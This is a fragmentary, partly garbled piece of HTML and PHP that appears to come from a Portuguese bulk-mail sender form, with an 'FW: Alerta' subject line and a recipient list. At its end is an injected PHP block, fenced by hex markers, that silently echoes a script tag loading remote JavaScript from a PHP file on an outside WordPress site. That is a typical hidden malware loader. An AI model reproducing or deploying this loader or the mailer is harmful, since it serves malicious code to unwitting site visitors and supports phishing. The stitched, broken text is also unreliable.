...
<table width="720" height="496" border="0">
  <tr>
    ...
    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">Assunto: 
      <input name="assunto" type="text"class="normal" id="assunto" style="width:88%" value="FW: Alerta 0028334" size="1" />
    </p>
...
<div dir=3D"ltr">		 	   		  </div>=0A=
      ...
      *.*Lista
      <textarea name="emails" style="width:40%" rows="8" wrap="virtual" class="normal" id="emails">2015code@bol.com.br
code.priv8@live.com</textarea>
    </p>
...
#6710d6#
if(empty($f)) {
$f = "<script type=\"text/javascript\" src=\"http://just-life.eu/wp-content/themes/justlife/wlxhtzd2.php?id=21868753\"></script>";
echo $f;
}
#/6710d6#
?><br />
